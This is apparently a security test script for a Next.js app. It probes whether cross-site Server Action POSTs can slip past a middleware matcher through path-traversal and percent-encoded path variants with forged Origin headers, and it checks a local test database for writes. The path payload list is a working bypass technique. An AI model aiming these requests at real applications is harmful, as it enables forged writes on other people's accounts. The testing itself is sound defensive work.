// z5 NEW (AC-39): can a cross-site Server Action POST skip the proxy by naming a path the proxy matcher excludes
// (matcher: /((?!_next/static|_next/image|favicon.ico).*)) but that the framework normalises to /projects?
import { capture, Tally, rq } from './z5lib.mjs';
import { execFileSync } from 'node:child_process';
const c = await capture();
const sql = (q) => execFileSync('psql', ['-h', '127.0.0.1', '-p', '55440', '-U', 'postgres', '-d', 'z5_main_test', '-Atc', q], { env: { ...process.env, PGPASSWORD: process.env.PG_PASSWORD } }).toString().trim();
const T = new Tally('csrf-matcher');
const body = '--BB\r\nContent-Disposition: form-data; name="_1_name"\r\n\r\nCSRFMATCH\r\n--BB\r\nContent-Disposition: form-data; name="0"\r\n\r\n[{"status":"idle","message":""},"$K1"]\r\n--BB--\r\n';
const paths = ['/projects', '/favicon.ico/../projects', '/_next/image/../projects', '/_next/static/../projects', '/_next/static/x/../../projects', '/favicon.ico/%2e%2e/projects', '/favicon.ico/%2E%2E/projects', '/_next/image%2f..%2fprojects', '/_next/image/..%2fprojects', '/favicon.ico/..;/projects', '/favicon.ico?/../projects', '/favicon.ico#/../projects', '//projects', '/./projects', '/_next/image/./../projects', '/%66avicon.ico/../projects', '/_next/%69mage/../projects', '/_next/static/..\\projects', '/_next/static/%2e%2e/projects'];
const origins = [{ Origin: 'https://evil.example', 'Sec-Fetch-Site': 'cross-site' }, { 'Sec-Fetch-Site': 'cross-site' }, {}, { Origin: 'null', 'Sec-Fetch-Site': 'cross-site' }];
const rows = [];
for (const p of paths) for (const o of origins) {
  const before = Number(sql("select count(*) from projects where name='CSRFMATCH'"));
  const r = await T.run(`${p} ${JSON.stringify(o)}`, rq({ method: 'POST', target: p, h: { ...o, 'Content-Type': 'multipart/form-data; boundary=BB', 'Next-Action': c.createId, Cookie: c.cookie }, body }));
  const after = Number(sql("select count(*) from projects where name='CSRFMATCH'"));
  rows.push({ path: p, origin: JSON.stringify(o), status: r.status, wrote: after > before });
  console.log(String(r.status).padEnd(4), after > before ? 'WROTE!!' : 'no-write', p, JSON.stringify(o));
}
console.log('writes by cross-site requests:', rows.filter((x) => x.wrote && x.path !== '/projects').length);
T.done();
